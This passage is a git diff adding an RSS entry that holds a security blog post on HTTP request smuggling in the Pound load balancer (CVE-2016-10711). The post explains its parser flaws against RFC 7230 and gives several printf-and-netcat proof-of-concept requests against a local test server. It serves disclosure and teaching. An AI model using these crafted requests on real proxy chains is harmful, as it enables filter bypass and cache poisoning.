@@ -6,6 +6,451 @@
 		<link>http://regilero.github.io</link>
 		
 			<item>
+				<title>Security: HTTP Smuggling, Apsis Pound load balancer</title>
+				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;https://www.makina-corpus.com/blog/metier/2018/contrebande-de-http-smuggling-load-balancer-apsis-pound&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
+&lt;small&gt;estimated read time: 15min&lt;/small&gt;&lt;/p&gt;
+
+&lt;h2&gt;Pound?&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.apsis.ch/pound/&quot;&gt;Pound&lt;/a&gt; is an Open Source HTTP load balancer, usually used as an SSL/TLS terminator
+(handling https and certificate in front of a more classical http backend).
+Back in time it was a simple and efficient way of adding SSL for a website.&lt;/p&gt;
+
+&lt;p&gt;If you check &lt;a href=&quot;http://www.apsis.ch/pound/&quot;&gt;the official website&lt;/a&gt; you'll see pound decribed as a load balancer, a reverse proxy, an SSL wrapper but also a &lt;strong&gt;sanitizer&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;an HTTP/HTTPS sanitizer: Pound will verify requests for correctness and accept only well-formed ones.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;The project activity has been slowing down and this last CVE published in early 2018
+may have triggered some warnings about the project activity.
+The Debian project removed the package, not only because of that CVE, where &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=888786&quot;&gt;a patch was available&lt;/a&gt;,
+from &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=891248&quot;&gt;this discussion&lt;/a&gt; it appears that compatibility with new versions of
+openSSL and the lack of activity on the project contributed greatly to the decision.&lt;/p&gt;
+
+&lt;h2&gt; Fixed versions of Pound&lt;/h2&gt;
+
+&lt;p&gt;If we check the &lt;a href=&quot;https://tracker.debian.org/pkg/pound&quot;&gt;Debian status page&lt;/a&gt; for this package today (2018-07-03) we have a warning that the package has been removed because it cannot be find in any development repository, and 3 actions : outdated version, 1 ignored security issue in stretch (stable) and one in jessie (oldstable).
+From my own test I cannot install it on jessie, but on stretch I'm still able to install it, with the security issues inside.&lt;/p&gt;
+
+&lt;p&gt;If you use a Suse package you have the &lt;a href=&quot;https://lists.opensuse.org/opensuse-updates/2018-02/msg00024.html&quot;&gt;security updates&lt;/a&gt; available.&lt;/p&gt;
+
+&lt;p&gt;On the &lt;a href=&quot;http://www.apsis.ch/pound/&quot;&gt;official project page&lt;/a&gt; the officiel stable version is now Pound-2.8 and contains the fix.
+The first fixed version was 2.8a (experimental), and there was a very long time for which only this experimental version was available.&lt;/p&gt;
+
+&lt;p&gt;The source code diff for version 2.8 is not very big: (&lt;a href=&quot;https://fossies.org/diffs/Pound/2.7_vs_2.8/http.c-diff.html&quot;&gt;fossies1&lt;/a&gt; | &lt;a href=&quot;https://fossies.org/diffs/Pound/2.7_vs_2.8/http.c-diff.html&quot;&gt;fossies2&lt;/a&gt;  | &lt;a href=&quot;https://fossies.org/diffs/Pound/2.7_vs_2.8/config.c-diff.html&quot;&gt;fossies3&lt;/a&gt;).
+It contains some feature removal (dynamic scaling) and security syntax filters on HTTP Smuggling issues.
+That's the interesting part.&lt;/p&gt;
+
+&lt;h2&gt;CVE-2016-10711&lt;/h2&gt;
+
+&lt;p&gt;The &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2016-10711/&quot;&gt;official CVE description&lt;/a&gt; is:&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;Apsis Pound before 2.8a allows request smuggling via crafted headers&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;Most of the issues are in fact &lt;strong&gt;very common mistakes&lt;/strong&gt; with HTTP parsers (with
+some specific rare issues also, like NULL character handling). Or I should say
+it &lt;strong&gt;was common&lt;/strong&gt; before 2005 and before &lt;a href=&quot;https://tools.ietf.org/html/rfc7230&quot;&gt;RFC 7230&lt;/a&gt;. In the past years
+I have reported similar issues in a lot of projects, small ones, and sometimes
+bigger ones, so it could be interesting to study some of these &lt;em&gt;'crafted headers'&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Note that, as explained later, Pound, being an SSl terminator, is not the most
+critical piece in a smuggling attack. Performing such attacks on a reverse proxy
+cache, or a common HTTP server, is more valuable for an attacker. But the whole
+'HTTP Smuggling attacks' paradigm is based on chaining syntax errors on multiple
+actors, so everyone should detect the strange &lt;em&gt;crafted headers&lt;/em&gt; and behave properly.&lt;/p&gt;
+
+&lt;h3&gt;1- Double content-length support:&lt;/h3&gt;
+
+&lt;p&gt;Any request with 2 &lt;code&gt;Content-Length&lt;/code&gt; headers &lt;strong&gt;MUST&lt;/strong&gt; be rejected.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.2&quot;&gt;RFC7230 section 3.3.2&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;If a message is received that has multiple Content-Length header
+fields with field-values consisting of the same decimal value, or a
+single Content-Length header field with a field value containing a
+list of identical decimal values (e.g., &quot;Content-Length: 42, 42&quot;),
+indicating that duplicate Content-Length header fields have been
+generated or combined by an upstream message processor, then the
+recipient MUST either reject the message as invalid or replace the
+duplicated field-values with a single valid Content-Length field
+containing that decimal value prior to determining the message body
+length or forwarding the message.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC7230 section 3.3.3&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;If a message is received without Transfer-Encoding and with
+either multiple Content-Length header fields having differing
+field-values or a single Content-Length header field having an
+invalid value, then the message framing is invalid and the
+recipient MUST treat it as an unrecoverable error.  If this is a
+request message, the server MUST respond with a 400 (Bad Request)
+status code and then close the connection.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;For Pound, If you send a request with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Content-Length: 0
+Content-Length: 147
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Result is &lt;code&gt;Size of Body = 0&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;If you send one with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Content-Length: 147
+Content-Length: 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Result is &lt;code&gt;Size of Body = 147&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The only official result should be &lt;strong&gt;an error&lt;/strong&gt;. If a previous actor in the HTTP
+communication contains the same flaw, but inverted, You have an easy smuggling factor.
+We will see below some example of HTTP pipelines exploits, the goal is usually
+to have a size which differs, one actor is seing 3 requests, another actor thinks
+there's only 2.&lt;/p&gt;
+
+&lt;h3&gt;2) Chunks priority on Content-Length&lt;/h3&gt;
+
+&lt;p&gt;Here we have again the &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC7230 section 3.3.3&lt;/a&gt;, but another point:&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;If a message is received with both a Transfer-Encoding and a
+Content-Length header field, the Transfer-Encoding overrides the
+Content-Length. Such a message might indicate an attempt to
+perform request smuggling (Section 9.5) or response splitting
+(Section 9.4) and ought to be handled as an error.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;So the rule is that you can reject the message (this is now the case in
+most servers), but at least, if you do not reject the message the
+chunked transmission has the priority on any Content-Length headers.&lt;/p&gt;
+
+&lt;p&gt;With Pound the rule was the first header read has the priority. Bad.&lt;/p&gt;
+
+&lt;p&gt;Let's see an example. Here I have Pound Server listening on HTTP port 8080 on 127.0.0.1. (So without HTTPS support, but believe me in HTTPS mode all the attacks works the same, you can even use openssl_client instead of netcat to push some printf output on it). Behind that Pound talks to an HTTP server (the backend), on any other port.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;I use &lt;code&gt;printf&lt;/code&gt; to render my HTTP queries, I do not use curl or wget, because I want full control on all characters.&lt;/li&gt;
+&lt;li&gt;I &lt;strong&gt;chain all the queries&lt;/strong&gt; in one single string, I do not wait for responses between each queries, that's called an &lt;strong&gt;HTTP pipeline&lt;/strong&gt;, without pipelining support on the server (here Pound) I cannot do anything&lt;/li&gt;
+&lt;li&gt;I send this string (of HTTP queries) to netcat (command &lt;code&gt;nc&lt;/code&gt;) which is a very low level command which simply controls the tcp/ip connection to the targeted IP and port.&lt;/li&gt;
+&lt;li&gt;this is the same as sending an HTTP query with a browser or with curl, but I have full control on nasty crafted headers&lt;/li&gt;
+&lt;li&gt;the attacker goal is to send messages that could contain a different number of queries if it is read by a valid parser or an invalid one, that's the &lt;strong&gt;technical goal&lt;/strong&gt;. The functionnal goal of this is security filter bypass or cache poisoning, or some more complex stuff, but like an &lt;code&gt;alert()&lt;/code&gt; for XSS, which is just a technical proff and not a functionnal attack, if you have the wrong number of valid responses, there's a security issue.&lt;/li&gt;
+&lt;li&gt;If you try it on a test environment you should track the requests sent by Pound on your backend, use Wireshark for example. Each request of the pipeline will be send individually to the backend, not in a pipeline.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length:56\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;For a &lt;strong&gt;valid parser&lt;/strong&gt; there are 3 queries:&lt;/p&gt;
+
+&lt;p&gt;First one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1[CRLF]
+Host:localhost[CRLF]
+**Content-length:56[CRLF]** (ignored and usually not send back to the backend)
+Transfer-Encoding: chunked[CRLF]
+Dummy:Header[CRLF]
+[CRLF]
+0[CRLF]  (end of chunks -&amp;gt; end of message)
+[CRLF]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Second one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /tmp HTTP/1.1[CRLF]
+Host:localhost[CRLF]
+Dummy:Header[CRLF]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And third one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /tests HTTP/1.1[CRLF]
+Host:localhost[CRLF]
+Dummy:Header[CRLF]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For an &lt;strong&gt;invalid parser&lt;/strong&gt; (here Pound) there's only 2 queries and the first one is:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1[CRLF]
+Host:localhost[CRLF]
+Content-length:56[CRLF]
+**Transfer-Encoding: chunked[CRLF]** (ignored and removed, hopefully)
+Dummy:Header[CRLF]
+[CRLF]
+0[CRLF]  (start of 56 bytes of body)
+[CRLF]
+GET /tmp HTTP/1.1[CRLF]
+Host:localhost[CRLF]
+Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;3) Bad chunked transmission&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC7230 section 3.3.3&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;If a Transfer-Encoding header field
+is present in a request and the chunked transfer coding is not
+the final encoding, the message body length cannot be determined
+reliably; the server MUST respond with the 400 (Bad Request)
+status code and then close the connection.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;Using &lt;code&gt;Transfer-Encoding: chunked, zorg&lt;/code&gt; we did not have the error 400.&lt;/p&gt;
+
+&lt;h3&gt;4) NULL in headers -&gt; concatenation&lt;/h3&gt;
+
+&lt;p&gt;That's an original issue, a rare one (but the NULL character is always fun to test).&lt;/p&gt;
+
+&lt;p&gt;Like most HTTP servers Pound is written in C, and C string ends with the NULL character (&lt;code&gt;\0&lt;/code&gt;).
+Finding a NULL character in an HTTP request (not the body part) should render an error,
+but sometimes the parser does not detect the NULL character because the parsed line was wrongly interpreted as a C string.&lt;/p&gt;
+
+&lt;p&gt;With Pound as soon as a NULL character was encountered in an header line the parser would continue the header with the next line.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;length: 56\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is another variation using the Double Content-length Support. This could be
+used if the previous actor in the chain of proxies had no support for double
+Content-Length (very likely).. but had support for NULL characters (less likely).&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;length: 51\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;On each attack we 2 responses instead of 3, you can also make 3 responses instead of 2.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 3 responses instead of 2 (2nd query is unmasked by pound)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 57\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And if you are still here you can compare the last two examples.
+On the first one we try a bad chunked transmission, and on the last one we use the &lt;code&gt;ops-fold&lt;/code&gt; syntax.
+Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted headers&lt;/em&gt; syntax transmitted to backends.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# chunk mode not applied&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Encoding: chunked,zorg\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 57\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# chunk mode applied, and &amp;#39;\r\n zorg\r\n&amp;#39; ops-fold transmitted&lt;/span&gt;
